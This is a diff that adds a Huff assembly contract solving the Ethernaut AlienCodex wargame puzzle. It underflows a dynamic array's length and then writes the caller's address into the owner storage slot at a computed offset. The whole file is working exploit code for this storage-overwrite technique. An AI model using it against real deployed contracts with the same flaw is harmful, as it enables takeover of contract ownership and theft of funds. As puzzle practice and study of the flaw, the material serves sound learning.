@@ -1,0 +1,89 @@
+
+// AlienCodexAttack
+// This contract can solve the Ethernaut #19 AlienCodex puzzle.
+
+#define function attack(address) nonpayable returns()
+
+// AlienCodex function we will call
+#define function makeContact() nonpayable returns()
+#define function retract() nonpayable returns()
+#define function revise(uint256, bytes32) nonpayable returns()
+
+#define macro MAIN() = takes(0) returns(0) {
+    // Ignore function sig
+
+    // Load AlienCodec contract address
+    0x04 calldataload           // [address]
+
+    // Make contact
+    __FUNC_SIG(makeContact)     // [sig address]
+    CALL(0x00, 0x04)            // [address]
+    
+    // Retract
+    __FUNC_SIG(retract)         // [sig address]
+    CALL(0x00, 0x04)            // [address]
+
+    // Revise
+    // Calculate the offset to use to index the under-flowed array,
+    // which will access the owner variable.
+    // Send the player's address (caller) as the payload, to take ownership.
+
+    // Calculate attack-offset
+    // Find the start address of the array's data section (keccak(slot 1)),
+    // then compute the offset that will overflow to 0.
+    0x01 0x00 mstore            // [address]
+    0x20 0x00 sha3              // [slot address]
+    0x00 sub                    // [attack-offset address]
+
+    // Store the two function parameters across three memory slots.
+
+    // Get upper portion (224 bits) of attack-offset
+    // CALL() will add in the function signature later
+    dup1                        // [attack-offset attack-offset address]
+    0x20 shr                    // [attack-offset-upper attack-offset address]
+    0x00 mstore                 // [attack-offset address]
+
+    // Combine lower portion of attack-offset (32 bits) and player address upper (224 bits)
+    0xe0 shl                    // [attack-offset-lower address]
+    caller                      // [caller attack-offset-lower address]
+    0x20 shr                    // [caller-upper attack-offset-lower address]
+    or                          // [combined address]
+    0x20 mstore                 // [address]
+
+    // Get lower portion of player address (32 bits)
+    caller 0xe0 shl             // [caller-lower address]
+    0x40 mstore                 // [address]
+
+    __FUNC_SIG(revise)
+    CALL(0x00, 0x44) // 0x44 is the length of the two arguments plus function sig
+
+    0x00 0x00 return
+}
+
+#define macro CALL(argsOffset, argsSize) = takes(2) returns(1) {
+    // Expects [sig address]
+    // sig should not be left-shifted yet.
+
+    // Left-shift sig and load into memory
+    // Combining the sig with existing 0x00 memory slot
+    0xe0 shl                    // [sig address]
+    <argsOffset> mload          // [arg1 sig address]
+    or                          // [arg1-combined address]
+    <argsOffset> mstore         // [address]
+
+    // Prepare call arguments
+    push0 push0                 // [retOffset, retSize, address]
+    <argsSize> <argsOffset>     // [argsOffset, argsSize, retOffset, retSize, address]
+    push0                       // [value, argsOffset, argsSize, retOffset, retSize, address]
+    dup6 gas                    // [gas, address, argsOffset, argsSize, retOffset, retSize, address]
+    
+    call                        // [success address]
+    
+    // Clear result
+    pop                         // [address]
+
+    // Clear argsOffset, so it can be reused.
+    // Would like to find a cleaner solution, but for now this works.
+    // Since I'm or'ing this location, subsequent calls need clean memory.
+    0x00 <argsOffset> mstore
+}
